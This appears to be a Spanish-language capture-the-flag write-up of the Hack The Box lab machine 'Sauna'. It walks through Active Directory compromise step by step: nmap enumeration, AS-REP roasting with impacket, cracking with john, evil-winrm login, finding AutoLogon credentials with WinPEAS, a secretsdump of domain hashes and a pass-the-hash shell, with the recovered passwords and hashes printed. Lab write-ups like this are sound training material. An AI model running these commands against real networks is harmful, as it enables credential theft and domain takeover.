
<p align="center">
<img src="https://miro.medium.com/v2/resize:fit:593/1*EBQbuWg_rrm5dHMNrR6jCQ.png">
</p>

Sauna es una máquina Windows de dificultad fácil en la cual se va a realizar un ataque de AS-REP-Roasting y en la fase de escalamiento de privilegios enumeración con la herramienta WinPEAS donde encontramos una contraseña y posteriormente hacer el volcado de los hashes de las contraseña del Domain Controller.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 sauna.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n sauna.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]           
└──╼ $nmap -p- --open -T5 -v -n sauna.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:53 EDT

PORT      STATE SERVICE                    
53/tcp    open  domain                       
80/tcp    open  http                 
88/tcp    open  kerberos-sec   
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p80,135,139,389,445 sauna.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]           
└──╼ $nmap -sC -sV -p80,135,139,389,445 sauna.htb -oN targeted.txt   
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 11:56 EDT

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0                           
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows


Host script results:
|_clock-skew: 7h00m54s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-04T22:40:33
|_  start_date: N/A
```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.
- `Puerto 445 (SMB):` compartir archivos a través de una red TCP/IP Windows.

### Enumeración HTTP

Revisando el sitio web, nos dirigimos a la pestaña `About us` y al final encontramos el nombre de varias personas, así que procedemos a crear un diccionario con diferentes combinaciones posibles de usuarios, así como se presenta a continuación

```bash
fergussmith
smithfergus
fsmith
ferguss
fergus-smith
f.smith
fergus.smith
shauncoins
coinsshaun
scoins
shaunc
shaun-coins
hugobear
bearhugo
hbear
hugob
hugo-bear
h.bear
hugo.bear
bowietaylor
taylorbowie
btaylor
bowiet
bowie-taylor
b.taylor
bowie.taylor
sophiedriver
driversophie
sdriver
sophied
```




## Explotación

Usando el script `GetNPUsers.py` de [impacket](https://github.com/SecureAuthCorp/impacket) podemos extraer el hash de los usuarios que en el Active Directory tengan habilitada la opción de no permitir pre-autenticación de Kerberos.

```console
┌──[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]
└──╼ $python3 /opt/impacket/examples/GetNPUsers.py EGOTISTICALBANK/ -usersfile usuarios.txt -format john -outputfile hashes.asreproast 
-dc-ip sauna.htb                                                                                                                       
Impacket v0.9.22.dev1+20200603.152956.fe40cb04 - Copyright 2020 SecureAuth Corporation
```

Abrimos el archivo `hashes.asreproast` y encontramos que está el hash del usuario `fsmith`

```
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]
└──╼ $cat hashes.asreproast 
$krb5asrep$fsmith@EGOTISTICALBANK:5bcbf870635e6fa3f045b33d7024e87b$98a81453df923b5ee80e6d51ea48611c44ed257c0972d9d5e5a08cdd3911ee519db89a9629bde7f02cb02c1c39f6c1d46a53ad7b565f08be74c007fcea137354b10e4041ec678d95e216b9163ff0cab491b19280714b939b7758369859105a7fde84520feefa5d03f4520a7e4635603cbfc01b3507164206351ea92302a45f6e738f38ea6828555996d7ef91dade424a4cb971850032a2f919b008d8e19b8c80ceecad5c01438c97ec12ffc2bd1c50e1d80ecf8190d017f6129f9f54ca50dec1a0b2a7afddfe00e57a396c177e330cdd9e12fb629657a4ef5df25f25727ba60f54e25edef7882f65096ae6bb01779c949b30bbf8e838071f7b
```

Usando la herramienta `john` vamos a crackear el hash encontrado anteriormente 

```
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]
└──╼ $sudo john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast 
[sudo] password for nicolasmira101: 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$fsmith@EGOTISTICALBANK)
1g 0:00:00:41 DONE (2020-06-04 11:12) 0.02437g/s 256854p/s 256854c/s 256854C/s Thing..Thereisnospoon
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Nos conectamos vía evil-winrm usando las credenciales encontradas anteriormente del usuario `fsmith` y ya obtendremos la flag del usuario

```bash
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Sauna]
└──╼ $evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> type ../Desktop/user.txt
1b5520...........................
```




## Escalamiento de privilegios

Descargamos y luego transferimos a la máquina Windows, la herramienta [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases) para realizar la enumeración del sistema y nos damos cuenta que arroja una contraseña

```bash
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /opt/winPEASx64.exe
Info: Uploading /opt/winPEASx64.exe to C:\Users\FSmith\Documents\winPEASx64.exe

*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEASx64.exe

[+] Looking for AutoLogon credentials(T1012)            
Some AutoLogon credentials were found!!  
DefaultDomainName             :  EGOTISTICALBANK
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```

Ahora, con la herramienta `impacket-secretsdump` vamos a hacer el volcado de los hashes de las contraseñas del Domain Controller y como podemos observar en la siguiente consola, ya tenemos el hash de la contraseña del `Administrator`

```bash
┌─[root@parrot]─[/opt]            
└──╼ #impacket-secretsdump "egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!"@10.10.10.175 -dc-ip 10.10.10.175            
Impacket v0.9.22.dev1+20200603.152956.fe40cb04 - Copyright 2020 SecureAuth Corporation 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                        
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                   
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
```

Finalmente usamos el comando `wmiexec` de impacket para abrir una shell semi-interactiva utilizando WMI (Windows Management Instrumentation). De esta forma, ya obtendremos la flag del Administrator.

```bash
┌──[root@parrot]─[/opt]                                    
└──╼ #impacket-wmiexec -hashes :d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
Impacket v0.9.22.dev1+20200603.152956.fe40cb04 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
f3ee04...........................
```

````

````
